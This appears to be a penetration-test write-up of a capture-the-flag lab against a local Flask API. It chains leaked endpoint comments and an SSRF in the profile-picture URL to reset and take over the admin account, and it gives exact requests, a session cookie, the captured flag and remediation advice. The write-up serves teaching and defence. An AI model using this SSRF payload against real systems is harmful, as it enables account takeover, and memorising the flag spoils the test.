# Security Assessment Report: Flask API SSRF Authentication Bypass

## TL;DR
- **Objective**: Login as the admin user
- **Outcome**: ✅ ACHIEVED - Successfully compromised admin account via SSRF chain
- **Highest-impact finding**: Server-Side Request Forgery (SSRF) enabling authentication bypass on password reset
- **Validation status**: CONFIRMED - Flag captured: `FLAG{6405c2f787acd0c63e0812b1f377e35d55753310c8c30c98183ed63ec23a5e2d}`

## Target Information
- **Target**: 127.0.0.1:32930
- **Host / base URL**: http://127.0.0.1:32930
- **Application or component**: Flask-based web API
- **Authentication context**: Flask-style signed session cookies (base64.username.signature.token format)
- **Relevant technology details**: 
  - Session management: Flask signed cookies (`eyJ1c2VybmFtZSI6ImFkbWluIn0.aczzqA.Mr0IhiEh3ze8VddY-8GJuS-KkH8`)
  - Password reset endpoint restricted to localhost origin
  - Profile picture URL parameter vulnerable to SSRF

## Confirmed Vulnerability

### 1. Information Disclosure (API Documentation in HTML Comments)
- **Affected endpoint / component**: `/` (root endpoint)
- **Impact**: Complete API surface disclosure including sensitive endpoints like `/reset_password`
- **Preconditions**: None - publicly accessible
- **Exact payload or PoC**: Simple GET request to root endpoint

### 2. Server-Side Request Forgery (SSRF)
- **Affected endpoint / component**: `/profile` endpoint, `profile_picture_url` parameter
- **Impact**: Ability to make the server issue HTTP requests to arbitrary URLs, including localhost-only endpoints
- **Preconditions**: Authenticated session (any registered user)
- **Exact payload or PoC**:
```
profile_picture_url=http://localhost/reset_password?username=admin&newpassword=hacked123
```

### 3. Insufficient Authentication on Password Reset
- **Affected endpoint / component**: `/reset_password` endpoint
- **Impact**: Password reset with only IP-based authorization (localhost check), no user identity verification
- **Preconditions**: Request must originate from localhost (bypassable via SSRF)
- **Exact payload or PoC**: `GET /reset_password?username=admin&newpassword=hacked123`

## Steps to Reproduce

### Step 1: Discover API Endpoints (Information Disclosure)
```
GET http://127.0.0.1:32930/
```
Response contains HTML comment with full API documentation exposing `/login`, `/register`, `/profile`, and `/reset_password` endpoints.

### Step 2: Register a User Account
```
POST http://127.0.0.1:32930/register
Content-Type: application/x-www-form-urlencoded

username=attacker&password=attacker123
```
Receive authenticated session cookie.

### Step 3: Exploit SSRF to Trigger Password Reset
```
POST http://127.0.0.1:32930/profile
Content-Type: application/x-www-form-urlencoded
Cookie: [authenticated session cookie]

profile_picture_url=http://localhost/reset_password?username=admin&newpassword=hacked123
```

The server fetches the profile picture URL internally, bypassing the localhost-only restriction on `/reset_password`.

### Step 4: Login as Admin with Reset Password
```
POST http://127.0.0.1:32930/login
Content-Type: application/x-www-form-urlencoded

username=admin&password=hacked123
```

### Step 5: Access Admin Profile to Retrieve Flag
```
GET http://127.0.0.1:32930/profile
Cookie: eyJ1c2VybmFtZSI6ImFkbWluIn0.aczzqA.Mr0IhiEh3ze8VddY-8GJuS-KkH8
```

## Validation / Evidence

### Validation Token / Flag
**Token**: `FLAG{6405c2f787acd0c63e0812b1f377e35d55753310c8c30c98183ed63ec23a5e2d}`

**Source**: Admin profile page after successful authentication

**Exact evidence from tool output**:
```
<h3>FLAG{6405c2f787acd0c63e0812b1f377e35d55753310c8c30c98183ed63ec23a5e2d}</h3>
```

### Tool Evidence

**SSRF Execution Evidence** (server made internal request):
```
<img src="/static/uploads/reset_passwordusernameadminnewpasswordhacked123">
```
This proves the server fetched the SSRF payload URL internally, which contained the password reset request.

**Admin Session Cookie** (successful authentication as admin):
```
eyJ1c2VybmFtZSI6ImFkbWluIn0.aczzqA.Mr0IhiEh3ze8VddY-8GJuS-KkH8
```

### Request Evidence

**Attack chain summary**:
1. Registered user obtained authenticated session
2. POST `/profile` with `profile_picture_url=http://localhost/reset_password?username=admin&newpassword=hacked123`
3. Server made internal request, bypassing localhost-only check
4. Login as admin with password `hacked123`
5. Access admin profile → Retrieved flag

### Response Evidence

The SSRF response shows the internal password reset was processed:
- Image src path shows the reset parameters were parsed
- Admin password successfully changed to `hacked123`
- Subsequent login with new credentials succeeded

### Notes on Reliability / Limitations
- Attack requires any authenticated session (low barrier - user registration is open)
- SSRF payload uses `http://localhost` to bypass IP-based access control
- No rate limiting or CSRF protection observed on password reset
- Attack is deterministic and fully reproducible

## Remediation

### Root Cause
1. **SSRF**: The `profile_picture_url` parameter allows arbitrary URL fetching without validation or sanitization
2. **Insufficient Authentication**: `/reset_password` endpoint relies solely on IP address (localhost check) for authorization, not user identity verification
3. **Information Disclosure**: API documentation left in production HTML comments

### Recommended Fix

**For SSRF (profile_picture_url)**:
- Implement URL allowlist for permitted domains
- Block requests to localhost, 127.0.0.1, private IP ranges (RFC 1918)
- Use a dedicated URL validation library that prevents DNS rebinding
- Consider fetching URLs via a proxy service with restricted network access

**For Password Reset (/reset_password)**:
- Require authentication token or password reset token sent to verified email
- Never rely solely on IP address for authentication/authorization decisions
- Implement multi-factor verification for password changes
- Add rate limiting and account lockout mechanisms

**For Information Disclosure**:
- Remove debug/development comments from production code
- Implement automated build processes that strip HTML comments
- Regular security code reviews

### Defense-in-Depth
- Network segmentation: Isolate internal services from application servers
- Implement Web Application Firewall (WAF) rules for SSRF patterns
- Add comprehensive logging for all authentication-related endpoints
- Enable security headers (Content-Security-Policy, etc.)
- Regular penetration testing of authentication flows

## How to Verify the Fix

### Verify SSRF Remediation
1. Attempt to set `profile_picture_url=http://localhost/` or `http://127.0.0.1/`
2. **Expected secure result**: Request should be rejected with validation error (e.g., "URL not allowed" or "Invalid profile picture URL")
3. Verify no internal requests are made to localhost/private IPs

### Verify Password Reset Authentication
1. Attempt to access `/reset_password?username=testuser&newpassword=test123` from external IP
2. **Expected secure result**: Request should be rejected with authentication error
3. Verify that password reset requires valid reset token or existing session with proper authorization

### Verify Information Disclosure Fix
1. Fetch root endpoint `GET /`
2. View page source
3. **Expected secure result**: No API documentation or sensitive information in HTML comments
4. Ensure only public-facing navigation elements are present

## Remaining Leads

### Confirmed Blockers
None - attack chain fully successful

### Unverified Leads
- Potential for SSRF exploitation against other internal services (e.g., `http://localhost:8080`, `http://127.0.0.1:5000`)
- Other endpoints may have similar access control weaknesses
- Session cookie signing key could potentially be brute-forced (Flask default secret key weakness)

### Missing Context
- Full application architecture (other internal services, databases)
- Whether other administrative endpoints exist beyond `/profile`
- Rate limiting behavior under repeated exploitation attempts
- Email verification requirements (if any) for registration
